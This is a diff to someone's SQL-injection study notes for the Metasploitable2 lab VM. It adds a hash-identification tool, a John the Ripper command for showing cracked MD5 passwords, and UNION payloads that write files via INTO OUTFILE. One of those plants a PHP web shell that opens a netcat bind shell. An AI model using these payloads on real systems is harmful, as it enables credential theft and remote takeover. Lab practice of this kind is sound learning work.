@@ -32,16 +32,24 @@ curl 10.0.0.3?id="1%20UNION%20SELECT%20%2A%20FROM%20customers%20--%20"
 
 ```
 
+### Get hash type
+```bash
+#https://github.com/tashima42/hash-id#readme
+snap install hash-id
+hash-id --help
+hash-id -h 8d3533d75ae2c3966d7e0d4fcc69216b # get hash type
+```
+
 ### Metasploitable2 Injections
 The single quote is needed becase it ends the first raw query param value and<br>
 starts the sql injection statment.<br>
 The same is for the #, it comments the rest of the raw query, allowing the injection.<br>
-```
+```sql
 ' union select 1,2,3 #
 
 ' union select database(),user(),version() #
 
-# same as
+-- same as
 select database(); # at mysql terminal
 
 ' union select '',table_schema,table_name from information_schema.tables #
@@ -56,7 +64,12 @@ select database(); # at mysql terminal
 
 # crack passwords with John the Ripper
 john passwords.txt --format=raw-MD5
+john passwords.txt --show --format=raw-MD5
 
 ' union select '','',load_file('/etc/passwd') #
+
+' union select '','this is test','' into outfile '/tmp/mytest' #
+
+' union select '<?php system("nc -lp 2222 -e /bin/bash"); ?>','','' into outfile '/tmp/myphp.php' #
 
 ```
